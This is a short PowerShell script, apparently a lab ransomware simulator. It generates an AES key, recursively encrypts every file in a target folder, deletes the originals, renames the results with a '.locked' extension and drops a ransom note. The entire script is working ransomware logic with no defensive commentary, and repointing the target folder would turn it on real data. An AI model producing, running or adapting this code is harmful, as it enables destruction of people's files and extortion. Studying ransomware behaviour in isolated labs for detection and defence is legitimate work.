# === CONFIGURATION ===
$targetFolder = "C:\Users\User\Downloads\test\"
$keyPath = "$env:APPDATA\labkey.txt"
$encExt = ".locked"
$ransomNote = "$targetFolder\README_LAB.txt"

# === GENERATE OR LOAD KEY ===
if (-not (Test-Path $keyPath)) {
    $key = [System.Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Maximum 256 }))
    Set-Content $keyPath $key
} else {
    $key = Get-Content $keyPath
}

# === SETUP AES ENCRYPTION ===
$Aes = New-Object System.Security.Cryptography.AesManaged
$Aes.Key = [System.Convert]::FromBase64String($key)
$Aes.Mode = "CBC"
$Aes.Padding = "PKCS7"

function Encrypt-File {
    param([string]$path)

    try {
        $iv = $Aes.IV
        $bytes = [IO.File]::ReadAllBytes($path)
        $transform = $Aes.CreateEncryptor()
        $encrypted = $transform.TransformFinalBlock($bytes, 0, $bytes.Length)

        $output = $iv + $encrypted
        $encPath = $path + $encExt
        [IO.File]::WriteAllBytes($encPath, $output)

        Remove-Item $path
        Write-Host "[+] Encrypted: $path"
    } catch {
        Write-Host "[!] Failed to encrypt: $path"
    }
}

# === START ENCRYPTING FILES ===
Get-ChildItem -Path $targetFolder -Recurse -File | ForEach-Object {
    if (-not $_.FullName.EndsWith($encExt)) {
        Encrypt-File $_.FullName
    }
}

# === DROP RANSOM NOTE ===
$note = @"
YOUR FILES HAVE BEEN ENCRYPTED
"@
Set-Content -Path $ransomNote -Value $note
Write-Host "Ransom note created at $ransomNote"

